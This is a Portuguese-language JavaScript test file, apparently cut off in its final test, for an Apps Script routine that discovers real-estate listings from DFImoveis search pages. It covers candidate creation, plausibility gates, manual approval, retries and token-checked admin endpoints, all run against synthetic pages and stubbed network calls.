// Busca de anúncios novos do Code.gs v2.6.0 (issue #179), executada no sandbox.
//
// Até a v2.5.0 nenhum anúncio novo entrava sozinho: LISTING_SOURCES tinha `search_urls`
// vazio e LISTING_CANDIDATES estava vazia. Os testes travam o caminho inteiro:
//
//   página de busca → links de anúncio (reconhecidos pelo caminho que LISTINGS já usa)
//   → candidato `pending` → página do candidato lida pelo parser da verificação
//   → portões → linha nova em LISTINGS com coordenada aproximada DECLARADA
//
// e os dois gatilhos de ação: editar uma busca e aprovar um candidato. Páginas sintéticas,
// pelo mesmo motivo de tests/appsscript-listings-verify.test.js.

import test from 'node:test';
import assert from 'node:assert/strict';
import { createAppsScriptSandbox, readJsonOutput } from './helpers/appsScriptSandbox.mjs';

const LISTINGS_HEADERS = [
  'listing_id', 'portal', 'transaction_type', 'title', 'source_url', 'source_url_type',
  'external_id', 'portal_listing_code', 'source_page_verified_at', 'portal_date_text', 'status',
  'last_seen_at', 'property_id', 'property_type', 'address', 'locality', 'ra_geo_id', 'latitude',
  'longitude', 'coordinate_precision', 'confidence_flag', 'observed_at', 'asking_price_brl',
  'area_m2', 'area_basis', 'asking_price_brl_m2', 'bedrooms', 'suites', 'parking_spaces',
  'condo_fee_brl', 'iptu_brl', 'published_days', 'views_count', 'interested_count', 'quality_flag',
  'regularization_status', 'first_seen_at', 'last_checked_at', 'last_price_change_at',
  'inactive_at', 'content_hash', 'parser_version', 'source_observed_at', 'update_run_id',
  'verification_failures', 'last_check_status', 'last_check_http_code', 'last_check_message',
];
const IX = Object.fromEntries(LISTINGS_HEADERS.map((h, i) => [h, i]));
const SEARCH_HEADERS = [
  'search_id', 'source_id', 'label', 'search_url', 'ra_geo_id', 'locality', 'property_type',
  'transaction_type', 'active', 'frequency', 'max_pages', 'last_run_at', 'last_status',
  'last_http_code', 'last_found_count', 'last_new_count', 'notes',
];
const SOURCES_HEADERS = [
  'source_id', 'source_name', 'source_type', 'active', 'collection_frequency', 'base_url',
  'search_urls', 'parser_key', 'parser_config_json', 'request_headers_json', 'notes',
  'last_success_at', 'last_error_at', 'last_run_id',
];

const HOST = 'https://www.dfimoveis.com.br';
const SEARCH_URL = `${HOST}/venda/df/brasilia/aguas-claras/apartamento`;
const NEW_1 = `${HOST}/imovel/apartamento-2-quartos-venda-aguas-claras-brasilia-df-1400001`;
const NEW_2 = `${HOST}/imovel/apartamento-3-quartos-venda-aguas-claras-brasilia-df-1400002`;
const EXISTING = `${HOST}/imovel/apartamento-3-quartos-venda-aguas-claras-brasilia-df-1364276`;

function listing(n, over = {}) {
  const row = LISTINGS_HEADERS.map(() => '');
  const base = {
    listing_id: `LIST_WEB_DFIMOVEIS_${1364270 + n}`, portal: 'DFImoveis', transaction_type: 'sale',
    title: 'Apartamento à venda · Águas Claras', source_url: `${HOST}/imovel/apartamento-venda-aguas-claras-${1364270 + n}`,
    source_url_type: 'individual_listing', external_id: 1364270 + n, status: 'active',
    property_type: 'apartamento', address: 'Rua 10', locality: 'Águas Claras', ra_geo_id: 'RA2026_RA-XX',
    latitude: -15.84 + n * 0.001, longitude: -48.02 - n * 0.001,
    coordinate_precision: 'locality_centroid_deterministic_jitter', confidence_flag: 'low_spatial_high_attribute',
    asking_price_brl: 800000, area_m2: 80, asking_price_brl_m2: 10000, bedrooms: 3,
    quality_flag: 'web_search_direct_item_page_indexed', last_seen_at: new Date('2026-08-20T00:00:00Z'),
  };
  for (const [k, v] of Object.entries({ ...base, ...over })) row[IX[k]] = v;
  return row;
}

function searchRow(over = {}) {
  const base = {
    search_id: 'SEARCH_DF_AGUAS_CLARAS_APTO', source_id: 'SRC_PORTAL_DFIMOVEIS', label: 'Apartamentos Águas Claras',
    search_url: SEARCH_URL, ra_geo_id: '', locality: 'Águas Claras', property_type: 'apartamento',
    transaction_type: 'sale', active: true, frequency: 'daily', max_pages: 1,
  };
  const merged = { ...base, ...over };
  return SEARCH_HEADERS.map((h) => (merged[h] === undefined ? '' : merged[h]));
}

function sheets({ searches = [searchRow()], extraListings = [] } = {}) {
  return {
    LISTINGS: [LISTINGS_HEADERS, listing(0), listing(1), listing(2), listing(6, { external_id: 1364276, listing_id: 'LIST_WEB_DFIMOVEIS_1364276', source_url: EXISTING }), ...extraListings],
    LISTING_SOURCES: [SOURCES_HEADERS, ['SRC_PORTAL_DFIMOVEIS', 'DFImoveis', 'portal', true, 'daily', '', '', 'generic_html', '', '', '', '', '', '']],
    LISTING_SEARCHES: [SEARCH_HEADERS, ...searches],
    APP_META: [['key', 'value', 'updated_at']],
    CHANGE_LOG: [['timestamp', 'sheet', 'range', 'record_id', 'old_value', 'new_value', 'editor', 'correlation_id', 'result', 'error_reason']],
  };
}

function searchPage(links) {
  return `<html><body><nav><a href="/imoveis/venda/df/brasilia/aguas-claras">Águas Claras</a><a href="/anunciar">Anunciar</a></nav>
${links.map((l) => `<div class="card"><a href="${l}"><img></a><a href="${l}">Ver</a></div>`).join('\n')}
<a href="https://www.wimoveis.com.br/propriedades/casa-3000000001.html">parceiro</a></body></html>`;
}

function listingPage({ price, area = 60, url, rooms = 2, title = 'Apartamento' }) {
  const data = {
    '@type': 'RealEstateListing', url,
    offers: { price },
    about: { '@type': 'Apartment', floorSize: { value: area }, numberOfRooms: rooms },
  };
  return `<html><head><title>${title}</title><script type="application/ld+json">${JSON.stringify(data)}</script></head><body></body></html>`;
}

const response = (code, body = '', headers = {}) => ({ getResponseCode: () => code, getContentText: () => body, getAllHeaders: () => headers });

function network(context, routes, calls = []) {
  const handle = (url) => {
    calls.push(url);
    const route = routes[url];
    if (!route) throw new Error(`URL não prevista: ${url}`);
    return typeof route === 'function' ? route() : route;
  };
  context.UrlFetchApp = {
    fetchAll: (requests) => requests.map((r) => handle(r.url)),
    fetch: (url) => handle(url),
  };
  context.Utilities.sleep = () => {};
  return calls;
}

const day = (n) => new Date(Date.UTC(2026, 9, 8 + n, 12, 0, 0));
const table = (sandbox, name) => {
  const [header, ...rows] = sandbox.sheets[name]._rows;
  return rows.map((r) => Object.fromEntries(header.map((h, i) => [h, r[i] === undefined ? '' : r[i]])));
};
const listingsById = (sandbox) => Object.fromEntries(table(sandbox, 'LISTINGS').map((r) => [r.listing_id, r]));
const lastRun = (sandbox) => table(sandbox, 'LISTINGS_UPDATE_RUNS').at(-1);
const meta = (sandbox, key) => (sandbox.sheets.APP_META._rows.find((r) => r[0] === key) || [])[1];

// --- caminho feliz ---------------------------------------------------------------------------

test('busca → candidatos só dos links novos → leitura → promoção com coordenada declarada', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([EXISTING, NEW_1, `${NEW_2}?utm=x`])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
    [NEW_2]: response(403),
  });

  const message = sandbox.context.runListingsDiscovery_({ now: day(0) });
  assert.match(message, /candidatos novos: 2; .*promovidos a LISTINGS: 1/);

  const search = table(sandbox, 'LISTING_SEARCHES')[0];
  assert.equal(search.last_status, 'ok');
  assert.equal(search.last_found_count, 3, 'três anúncios na página; nav, busca e outro portal ficam fora');
  assert.equal(search.last_new_count, 2);
  assert.deepEqual(search.last_run_at, day(0));

  const candidates = Object.fromEntries(table(sandbox, 'LISTING_CANDIDATES').map((c) => [c.external_id, c]));
  assert.deepEqual(Object.keys(candidates).sort(), ['1400001', '1400002']);
  assert.equal(candidates['1400002'].source_url, NEW_2, 'query string não entra na URL');
  assert.equal(candidates['1400001'].status, 'promoted');
  assert.equal(candidates['1400002'].status, 'pending');
  assert.match(candidates['1400002'].reject_reason, /^leitura pendente \(1\/5\): HTTP_403/);
  assert.equal(candidates['1400001'].discovered_by, 'search:SEARCH_DF_AGUAS_CLARAS_APTO');

  const created = listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001;
  assert.ok(created, 'linha nova em LISTINGS');
  assert.equal(created.status, 'active');
  assert.equal(created.portal, 'DFImoveis');
  assert.equal(created.title, 'Apartamento à venda · Águas Claras');
  assert.equal(created.asking_price_brl, 620000);
  assert.equal(created.area_m2, 60);
  assert.equal(created.asking_price_brl_m2, 10333.33);
  assert.equal(created.bedrooms, 2);
  assert.equal(created.ra_geo_id, 'RA2026_RA-XX', 'RA da localidade, aprendida de LISTINGS');
  assert.equal(created.coordinate_precision, 'locality_centroid_deterministic_jitter');
  assert.equal(created.confidence_flag, 'low_spatial_high_attribute');
  assert.equal(created.quality_flag, 'automated_item_page_verified');
  assert.equal(created.property_id, 'PROP_WEB_DFIMOVEIS_1400001');
  assert.deepEqual(created.last_seen_at, day(0));
  assert.equal(created.last_check_status, 'ok');
  // Centroide = mediana dos pontos de Águas Claras; o desvio fica dentro do raio declarado.
  const dLat = Math.abs(created.latitude - -15.838);
  const dLon = Math.abs(created.longitude - -48.022);
  assert.ok(dLat < 0.0045 && dLon < 0.0050, `jitter fora do raio: ${dLat}, ${dLon}`);

  const events = table(sandbox, 'LISTING_EVENTS');
  assert.deepEqual(events.map((e) => [e.event_type, e.listing_id]), [['created', 'LIST_WEB_DFIMOVEIS_1400001']]);

  const run = lastRun(sandbox);
  assert.match(run.run_id, /^RUN_DISCOVERY_/);
  assert.equal(run.status, 'partial', 'uma leitura bloqueada');
  assert.equal(run.candidate_rows, 2);
  assert.equal(run.new_listings, 1);
  assert.equal(meta(sandbox, 'listings_pending_candidates'), '1');
});

test('segunda execução no mesmo dia não rebaixa a busca, mas tenta de novo o candidato bloqueado', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  let blocked = true;
  const calls = network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1, NEW_2])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
    [NEW_2]: () => (blocked ? response(403) : response(200, listingPage({ price: 700000, area: 70, url: NEW_2, rooms: 3 }))),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  calls.length = 0;
  blocked = false;
  sandbox.context.runListingsDiscovery_({ now: new Date(day(0).getTime() + 3600000) });
  assert.deepEqual(calls, [NEW_2], 'busca diária já rodou hoje; só o candidato pendente');
  assert.ok(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400002);
  assert.equal(table(sandbox, 'LISTING_CANDIDATES').length, 2, 'nada duplicado');
});

test('candidato bloqueado cinco vezes para de ser tentado e pede preenchimento à mão', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  const calls = network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_2])),
    [NEW_2]: response(429),
  });
  for (let d = 0; d < 6; d++) sandbox.context.runListingsDiscovery_({ now: day(d) });
  assert.equal(calls.filter((u) => u === NEW_2).length, 5);
  const cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.status, 'pending');
  assert.match(cand.reject_reason, /^leitura falhou 5 vezes; preencha preço, área e quartos à mão e aprove/);
});

test('candidato cuja página já sumiu é rejeitado, não promovido', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, { [SEARCH_URL]: response(200, searchPage([NEW_1])), [NEW_1]: response(404) });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  const cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.status, 'rejected');
  assert.match(cand.reject_reason, /removido antes da promoção/);
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined);
});

// --- portões ----------------------------------------------------------------------------------

test('preço/m² implausível fica pendente; aprovado à mão, é promovido', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: response(200, listingPage({ price: 6200000, url: NEW_1 })), // ~10× a mediana
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  let cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.status, 'pending');
  assert.match(cand.reject_reason, /preço\/m² 10\.3× a mediana de apartamento em Águas Claras/);

  // A pessoa confere e aprova na planilha.
  const statusCol = sandbox.sheets.LISTING_CANDIDATES._rows[0].indexOf('status');
  sandbox.sheets.LISTING_CANDIDATES._rows[1][statusCol] = 'approved';
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.status, 'promoted');
  const event = table(sandbox, 'LISTING_EVENTS')[0];
  assert.match(event.details, /aprovado à mão/);
});

test('aprovação manual não dispensa dado obrigatório; a pessoa completa a linha e aprova', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets({ searches: [searchRow({ locality: '', property_type: '' })] }) });
  const odd = `${HOST}/imovel/imovel-a-venda-df-1400009`;
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([odd])),
    [odd]: response(200, listingPage({ price: 650000, url: odd, title: 'Imóvel à venda' })),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  let cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.status, 'pending');
  assert.match(cand.reject_reason, /tipo de imóvel desconhecido/);
  assert.match(cand.reject_reason, /localidade não identificada/);

  const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
  const row = sandbox.sheets.LISTING_CANDIDATES._rows[1];
  row[header.indexOf('status')] = 'approved';
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.status, 'approved', 'aprovado, mas sem tipo e sem localidade não entra');

  row[header.indexOf('property_type')] = 'apartamento';
  row[header.indexOf('locality')] = 'Águas Claras';
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  assert.equal(table(sandbox, 'LISTING_CANDIDATES')[0].status, 'promoted');
  assert.ok(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400009);
});

test('rejeitado à mão nunca volta, nem como candidato novo', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  const calls = network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: response(200, listingPage({ price: 6200000, url: NEW_1 })),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
  sandbox.sheets.LISTING_CANDIDATES._rows[1][header.indexOf('status')] = 'rejected';
  calls.length = 0;
  sandbox.context.runListingsDiscovery_({ now: day(1) });
  assert.deepEqual(calls, [SEARCH_URL]);
  assert.equal(table(sandbox, 'LISTING_CANDIDATES').length, 1);
  assert.equal(table(sandbox, 'LISTING_CANDIDATES')[0].status, 'rejected');
});

test('portões em função pura: duplicata, transação, RA por nome do RA_PROFILES e RA explícita', () => {
  const { context } = createAppsScriptSandbox();
  const ref = context.buildListingsReference_(
    [listing(0), listing(1)].map((r) => r), Object.fromEntries(LISTINGS_HEADERS.map((h, i) => [h, i])),
    [['RA_19', 'Candangolândia', 'RA-XIX'], ['RA_20', 'Águas Claras', 'RA-XX']], { ra_geo_id: 0, ra_name: 1, ra_code: 2 },
  );
  const base = {
    source_name: 'DFImoveis', external_id: '1400001', source_url: NEW_1, transaction_type: 'sale',
    property_type: 'apartamento', asking_price_brl: 600000, area_m2: 60, bedrooms: 2, locality: 'Águas Claras',
  };
  assert.deepEqual([...context.evaluateListingCandidate_(base, ref).hard], []);
  assert.match(context.evaluateListingCandidate_({ ...base, external_id: '1364270' }, ref).hard.join(), /já existe em LISTINGS/);
  assert.match(context.evaluateListingCandidate_({ ...base, transaction_type: 'rent' }, ref).hard.join(), /não é venda/);
  // Localidade nova, mas com nome de RA: a RA sai do RA_PROFILES; sem ponto de referência, não promove.
  const verdict = context.evaluateListingCandidate_({ ...base, locality: 'Candangolândia' }, ref);
  assert.equal(verdict.resolved.ra, 'RA2026_RA-XIX');
  assert.match(verdict.hard.join(), /sem coordenada de referência/);
  // RA explícita na busca, em qualquer das três grafias da planilha.
  for (const given of ['RA2026_RA-XX', 'RA-XX', 'RA_20']) {
    assert.equal(context.evaluateListingCandidate_({ ...base, locality: 'Guará Novo', ra_geo_id: given }, ref).resolved.ra, 'RA2026_RA-XX', given);
  }
  // Terreno não exige quartos.
  assert.deepEqual([...context.evaluateListingCandidate_({ ...base, property_type: 'terreno', bedrooms: '' }, ref).hard], []);
});

test('jitter determinístico: mesmo id, mesmo ponto; ids diferentes, pontos diferentes', () => {
  const { context } = createAppsScriptSandbox();
  const a = context.deterministicJitter_('LIST_WEB_DFIMOVEIS_1', { lat: -15.8, lon: -47.9 });
  const b = context.deterministicJitter_('LIST_WEB_DFIMOVEIS_1', { lat: -15.8, lon: -47.9 });
  const c = context.deterministicJitter_('LIST_WEB_DFIMOVEIS_2', { lat: -15.8, lon: -47.9 });
  assert.deepEqual(JSON.stringify(a), JSON.stringify(b));
  assert.notEqual(JSON.stringify(a), JSON.stringify(c));
  assert.ok(Math.abs(a.lat + 15.8) <= 0.004);
});

// --- leitura da página de busca (pura) ---------------------------------------------------------

test('links: só o caminho de anúncio do portal, sem repetição, sem outro host; regex do LISTING_SOURCES vale', () => {
  const { context } = createAppsScriptSandbox();
  const html = searchPage([EXISTING, NEW_1, NEW_1]) +
    `<script type="application/ld+json">${JSON.stringify({ '@type': 'ItemList', itemListElement: [{ url: NEW_2 }] })}</script>`;
  const links = context.extractListingLinks_(html, SEARCH_URL, { imovel: true }, null);
  assert.deepEqual([...links.map((l) => l.token)], ['1364276', '1400001', '1400002']);
  const custom = context.extractListingLinks_('<a href="/detalhe/x-5555555">x</a><a href="/imovel/y-6666666">y</a>', SEARCH_URL, {}, /^\/detalhe\//);
  assert.deepEqual([...custom.map((l) => l.token)], ['5555555']);
});

test('paginação por `{page}`, com teto', () => {
  const { context } = createAppsScriptSandbox();
  assert.deepEqual([...context.searchPageUrls_('https://x/busca?pagina={page}', 3)], ['https://x/busca?pagina=1', 'https://x/busca?pagina=2', 'https://x/busca?pagina=3']);
  assert.equal(context.searchPageUrls_('https://x/busca?pagina={page}', 50).length, 5);
  assert.deepEqual([...context.searchPageUrls_('https://x/busca', 9)], ['https://x/busca']);
});

test('inferências: localidade mais longa no slug, tipo e quartos pela URL', () => {
  const sandbox = createAppsScriptSandbox();
  const { context } = sandbox;
  const ref = context.buildListingsReference_(
    [listing(0, { locality: 'Lago Norte' }), listing(1, { locality: 'Norte' })],
    Object.fromEntries(LISTINGS_HEADERS.map((h, i) => [h, i])), [], {},
  );
  assert.equal(context.inferLocalityFromUrl_(`${HOST}/imovel/casa-4-quartos-venda-lago-norte-brasilia-df-1217253`, ref), 'Lago Norte');
  assert.equal(context.inferPropertyType_('/propriedades/casa-em-condominio-4-quartos-2994827013.html'), 'casa_condominio');
  assert.equal(context.inferPropertyType_('/imovel/casa-4-quartos-venda-lago-norte'), 'casa');
  assert.equal(context.inferPropertyType_('/imovel/kitnet-venda-guara'), 'kitnet');
  assert.equal(context.inferPropertyType_('/imovel/lote-venda-vicente-pires'), 'terreno');
  assert.equal(context.inferPropertyType_('/imovel/jardim-botanico-mansao'), '', 'nada adivinhado');
  assert.equal(context.inferBedroomsFromUrl_('https://www.imovelweb.com.br/propriedades/casa-4-qts-4-suites-2-vagas-3043081631.html'), 4);
  assert.equal(context.inferBedroomsFromUrl_(NEW_1), 2);
});

// --- busca: estados de erro ---------------------------------------------------------------------

test('sem autorização a busca falha sem gravar candidato nem anúncio', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  sandbox.context.UrlFetchApp = { fetchAll() { throw new Error('Required permissions: https://www.googleapis.com/auth/script.external_request'); } };
  const message = sandbox.context.runListingsDiscovery_({ now: day(0) });
  assert.match(message, /SEM AUTORIZAÇÃO/);
  assert.equal(table(sandbox, 'LISTING_CANDIDATES').length, 0);
  assert.equal(lastRun(sandbox).status, 'failed');
  assert.equal(meta(sandbox, 'listings_update_status'), 'auth_required');
});

test('busca bloqueada fica `blocked` na linha; página sem link reconhecido é avisada no run', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets({ searches: [
    searchRow(),
    searchRow({ search_id: 'S2', search_url: `${HOST}/venda/df/brasilia/lago-sul/casa` }),
  ] }) });
  network(sandbox.context, {
    [SEARCH_URL]: response(403),
    [`${HOST}/venda/df/brasilia/lago-sul/casa`]: response(200, '<html><body>Nenhum resultado</body></html>'),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  const [s1, s2] = table(sandbox, 'LISTING_SEARCHES');
  assert.equal(s1.last_status, 'blocked');
  assert.equal(s1.last_http_code, 403);
  assert.equal(s2.last_status, 'ok');
  assert.equal(s2.last_found_count, 0);
  assert.match(lastRun(sandbox).error_details, /S2: nenhum link de anúncio reconhecido/);
});

test('busca inativa, manual ou semanal recente não roda', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets({ searches: [
    searchRow({ search_id: 'OFF', active: false }),
    searchRow({ search_id: 'MAN', frequency: 'manual', last_run_at: day(-1) }),
    searchRow({ search_id: 'WEEK', frequency: 'weekly', last_run_at: day(-3) }),
  ] }) });
  const calls = network(sandbox.context, {});
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  assert.deepEqual(calls, []);
});

// --- gatilhos de ação ---------------------------------------------------------------------------

function editEvent(sandbox, sheetName, row, column, numColumns = 1) {
  const sheet = sandbox.sheets[sheetName];
  return {
    range: {
      getSheet: () => sheet, getRow: () => row, getColumn: () => column,
      getNumRows: () => 1, getNumColumns: () => numColumns,
    },
  };
}

test('editar a URL de uma busca a faz vencer hoje e agenda UMA busca', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets({ searches: [searchRow({ last_run_at: day(0) })] }) });
  const urlCol = SEARCH_HEADERS.indexOf('search_url') + 1;
  sandbox.context.handleEdit(editEvent(sandbox, 'LISTING_SEARCHES', 2, urlCol));
  sandbox.context.handleEdit(editEvent(sandbox, 'LISTING_SEARCHES', 2, urlCol));
  assert.equal(table(sandbox, 'LISTING_SEARCHES')[0].last_run_at, '');
  assert.deepEqual(sandbox.triggers.map((t) => t.getHandlerFunction()), ['listingsDiscoveryContinue']);
  assert.equal(sandbox.sheets.CHANGE_LOG._rows.length, 1, 'aba da rotina não passa pelo log de edição de dados');

  // Editar só a coluna de resultado (escrita da própria rotina, ou à mão) não agenda nada.
  sandbox.triggers.length = 0;
  sandbox.context.handleEdit(editEvent(sandbox, 'LISTING_SEARCHES', 2, SEARCH_HEADERS.indexOf('last_status') + 1));
  assert.equal(sandbox.triggers.length, 0);
});

test('aprovar candidato agenda a busca; rejeitar não', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, { [SEARCH_URL]: response(200, searchPage([NEW_1])), [NEW_1]: response(403) });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  sandbox.triggers.length = 0;
  const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
  const statusCol = header.indexOf('status') + 1;

  sandbox.sheets.LISTING_CANDIDATES._rows[1][statusCol - 1] = 'rejected';
  sandbox.context.handleEdit(editEvent(sandbox, 'LISTING_CANDIDATES', 2, statusCol));
  assert.equal(sandbox.triggers.length, 0);

  sandbox.sheets.LISTING_CANDIDATES._rows[1][statusCol - 1] = 'approved';
  sandbox.context.handleEdit(editEvent(sandbox, 'LISTING_CANDIDATES', 2, statusCol));
  assert.deepEqual(sandbox.triggers.map((t) => t.getHandlerFunction()), ['listingsDiscoveryContinue']);
});

// --- doPost ---------------------------------------------------------------------------------------

function post(context, body) {
  return readJsonOutput(context.doPost({ postData: { contents: JSON.stringify(body) } }));
}

test('doPost listings_job: exige token, valida o job e só agenda', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets(), scriptProperties: { ADMIN_TOKEN: 't', DATASET_VERSION: '1' } });
  const { context, triggers } = sandbox;
  assert.equal(post(context, { action: 'listings_job', job: 'verify' }).error.code, 'UNAUTHENTICATED');
  assert.equal(post(context, { token: 't', action: 'listings_job', job: 'apagar' }).error.code, 'INVALID_PAYLOAD');
  const first = post(context, { token: 't', action: 'listings_job', job: 'discovery' });
  assert.equal(first.ok, true);
  assert.equal(first.record.scheduled, true);
  const again = post(context, { token: 't', action: 'listings_job', job: 'discovery' });
  assert.equal(again.record.already_pending, true);
  post(context, { token: 't', action: 'listings_job', job: 'verify' });
  assert.deepEqual(triggers.map((t) => t.getHandlerFunction()).sort(), ['listingsDiscoveryContinue', 'listingsVerifyContinue']);
});

test('doPost review_candidate: muda status, registra no CHANGE_LOG, agenda na aprovação, recusa promovido', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets(), scriptProperties: { ADMIN_TOKEN: 't', DATASET_VERSION: '1' } });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1, NEW_2])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
    [NEW_2]: response(403),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  sandbox.triggers.length = 0;

  const res = post(sandbox.context, { token: 't', action: 'review_candidate', candidate_id: 'CAND_DFIMOVEIS_1400002', decision: 'approved', editor: 'Rafael' });
  assert.equal(res.ok, true);
  assert.equal(res.record.discovery_scheduled, true);
  const cand = table(sandbox, 'LISTING_CANDIDATES').find((c) => c.candidate_id === 'CAND_DFIMOVEIS_1400002');
  assert.equal(cand.status, 'approved');
  const log = sandbox.sheets.CHANGE_LOG._rows.at(-1);
  assert.deepEqual([log[1], log[3], log[4], log[5]], ['LISTING_CANDIDATES', 'CAND_DFIMOVEIS_1400002', 'pending', 'approved']);

  const promoted = post(sandbox.context, { token: 't', action: 'review_candidate', candidate_id: 'CAND_DFIMOVEIS_1400001', decision: 'rejected' });
  assert.equal(promoted.error.code, 'VALIDATION_ERROR');
  assert.equal(post(sandbox.context, { token: 't', action: 'review_candidate', candidate_id: 'X', decision: 'approved' }).error.code, 'NOT_FOUND');
  assert.equal(post(sandbox.context, { token: 't', action: 'review_candidate', candidate_id: 'X', decision: 'talvez' }).error.code, 'INVALID_PAYLOAD');
});

test('anúncio criado pela área administrativa agenda a verificação', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets(), scriptProperties: { ADMIN_TOKEN: 't', DATASET_VERSION: '1' } });
  const fields = {
    address: 'Rua 12', area_basis: 'portal_area_unspecified', area_m2: 70, asking_price_brl: 700000, bedrooms: 2,
    confidence_flag: 'low_spatial_high_attribute', coordinate_precision: 'locality_centroid_deterministic_jitter',
    last_seen_at: '2026-10-08', latitude: -15.84, locality: 'Águas Claras', longitude: -48.02, observed_at: '2026-10-08',
    portal: 'DFImoveis', property_type: 'apartamento', quality_flag: 'public_item_page_verified', ra_geo_id: 'RA2026_RA-XX',
    source_page_verified_at: '2026-10-08', source_url: NEW_1, source_url_type: 'individual_listing', status: 'active',
    title: 'Apartamento 2 quartos', transaction_type: 'sale',
  };
  const res = post(sandbox.context, { token: 't', action: 'create', sheet: 'LISTINGS', id: 'LIST_ADMIN_1', fields });
  assert.equal(res.ok, true);
  assert.deepEqual(sandbox.triggers.map((t) => t.getHandlerFunction()), ['listingsVerifyContinue']);
});

test('candidato escrito por fora (agente externo) segue o mesmo caminho, e o que foi digitado vale mais que o parser', () => {
  const CAND_HEADERS = [
    'candidate_id', 'discovered_at', 'discovered_by', 'source_id', 'source_name', 'source_url',
    'external_id', 'title', 'transaction_type', 'property_type', 'address', 'locality',
    'ra_geo_id', 'latitude', 'longitude', 'asking_price_brl', 'area_m2', 'bedrooms', 'suites',
    'parking_spaces', 'condo_fee_brl', 'iptu_brl', 'features_json', 'raw_json', 'status',
    'reviewed_at', 'reject_reason', 'parser_version',
  ];
  const external = Object.fromEntries(CAND_HEADERS.map((h) => [h, '']));
  Object.assign(external, {
    candidate_id: 'CAND_GPT_1', discovered_at: day(-1), discovered_by: 'agente:gpt', source_name: 'DFImoveis',
    source_url: NEW_1, external_id: '1400001', transaction_type: 'sale', property_type: 'apartamento',
    locality: 'Águas Claras', asking_price_brl: 640000, status: 'pending',
  });
  const base = sheets({ searches: [] });
  base.LISTING_CANDIDATES = [CAND_HEADERS, CAND_HEADERS.map((h) => external[h])];
  const sandbox = createAppsScriptSandbox({ sheets: base });
  network(sandbox.context, { [NEW_1]: response(200, listingPage({ price: 620000, area: 64, url: NEW_1 })) });
  sandbox.context.runListingsDiscovery_({ now: day(0) });

  const cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.asking_price_brl, 640000, 'preço digitado não é trocado pelo lido');
  assert.equal(cand.area_m2, 64, 'campo vazio é preenchido pela leitura');
  assert.equal(cand.status, 'promoted');
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001.asking_price_brl, 640000);
});

test('lock da planilha ocupado: a busca não grava nada e refaz tudo na continuação', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets(), documentLockBusy: true });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  assert.equal(table(sandbox, 'LISTING_CANDIDATES').length, 0);
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined);
  assert.equal(table(sandbox, 'LISTING_SEARCHES')[0].last_run_at, '', 'busca continua vencida');
  assert.equal(lastRun(sandbox).status, 'failed');
  assert.equal(lastRun(sandbox).new_listings, 0);
  assert.match(lastRun(sandbox).error_details, /^DOCUMENT_LOCK_BUSY/);
  assert.deepEqual(sandbox.triggers.map((t) => t.getHandlerFunction()), ['listingsDiscoveryContinue']);
});

test('anúncio criado por outro escritor durante o run não é anexado de novo', () => {
  // A referência de duplicidade é lida antes do lock; a promoção relê os ids com o lock.
